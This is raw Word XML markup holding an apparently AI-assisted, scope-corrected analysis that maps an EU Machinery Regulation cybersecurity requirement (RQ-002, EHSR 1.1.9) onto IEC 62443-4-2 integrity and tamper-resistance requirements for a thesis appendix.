      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>flood/DoS resilience</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DCP/update authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727B4ACC" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to (a) re-check </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-006 and RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the same boundary realignment (RQ-006 reused RQ-004's identity-integrity material; RQ-010 should now cleanly </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receive</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the DoS/DCP-flood tests), or (b) proceed to consolidation of the corrected set into the thesis appendix?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32748E3F" w14:textId="77777777" w:rsidR="0047270E" w:rsidRDefault="0047270E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A143C07" w14:textId="169E955A" w:rsidR="00C1714F" w:rsidRPr="00C1714F" w:rsidRDefault="00C1714F" w:rsidP="00C1714F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t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5551EB63" w14:textId="77777777" w:rsidR="003670E7" w:rsidRDefault="003670E7" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EE4D0E9" w14:textId="77777777" w:rsidR="003670E7" w:rsidRDefault="003670E7" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="562AD8C7" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-002 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44CB28F7" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> You are right, and thank you for the catch. In my original RQ-002 I imported the*"collect evidence of intervention"* clause and mapped </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 2.8 / CR 6.1 (auditable events / audit log)</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset I (Audit Data)</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Repudiation</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> threat into this requirement. That was </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scope creep</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — evidence </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>collection</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the substance of </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-003</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, which we subsequently processed on its own. RQ-002 is a pure </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protection-against-corruption</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement (integrity + tamper-resistance), not an accountability/audit one. Below is the corrected analysis with the audit material removed and returned to RQ-003.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40EF65A5" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00000000" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="47733A2E">
          <v:rect id="_x0000_i1032" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1B4395" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFC8066" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D697A8" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Your text is EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §1</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protect … against corruption, whether accidental or intentional</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">"). This is an </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity / tamper-resistance</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement across three surfaces: the </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>transmitted</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> frame, the </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>stored</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameters, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>physical</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> address/mode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164"/>
        <w:gridCol w:w="1743"/>
        <w:gridCol w:w="4121"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="586BBB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84D044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CR / EDR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367814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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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A953A9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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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FB3D4F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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / Addition</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00D04F61" w14:paraId="382D5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36971" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t>CR 3.1 – Communication Integrity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0E2BB" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A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6C8C5" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Correct for the </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>transmitted</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> 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1072F" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Keep. </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Add RE(1) Communication Authentication</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — RE(1) is the </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>intentional</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>-corruption limb; the base CR only addresses integrity, not authenticity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="7DAB0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FE7DC" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">EDR 3.11 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>Physical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tamper</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>resistance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EB005" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A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3AC80" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Correct for the physical switch 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D6792" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Keep — but scoped to the </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>resistance</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> limb (a barrier that resists/reveals corruption). </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">The </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>audit-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>record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limb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is</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>not</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>part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of</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> RQ-002.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="5AEAB9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FDA2B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CR 3.4 – Software &amp; Information Integrity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17B84" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> 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C2CE6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t>Correct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addition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36B5E" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">The </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> protect the </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>stored</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> safety configuration (data at rest), which CR 3.1 (in-transit) does not cover. </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve">This </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>is</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>legitimate</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> RQ-002 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>protection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surface</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="4BDCE4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05670" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="3" w:author="Unknown">
              <w:r w:rsidRPr="00690A16">
                <w:delText>CR 2.8 / CR 6.1 – Auditable events / Audit log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0F7AE" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>❌</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Removed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AA4C0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 xml:space="preserve">Scope </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>creep</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-003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F5217" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">These map to the </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>evidence-collection</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> obligation, which is </w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>RQ-003</w:t>
            </w:r>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:t>Removed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from</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:t xml:space="preserve"> RQ-002.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7445E2EE" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-002 → EHSR 1.1.9 §1 →</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 3.1 (+RE1) [transmitted data], CR 3.4 [stored parameters], EDR 3.11 [physical tamper-resistance]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00690A16">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00690A16">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="381FB813" w14:textId="77777777" w:rsidR="00690A16" w:rsidRPr="00690A16" w:rsidRDefault="00690A16" w:rsidP="00690A16">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00690A16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1164"/>
        <w:gridCol w:w="6009"/>
      </w:tblGrid>
      <w:tr w:rsidR="00690A16" w:rsidRPr="00690A16" w14:paraId="3E633D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E5953B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9ADA98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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16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C0AAC0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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00690A16">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
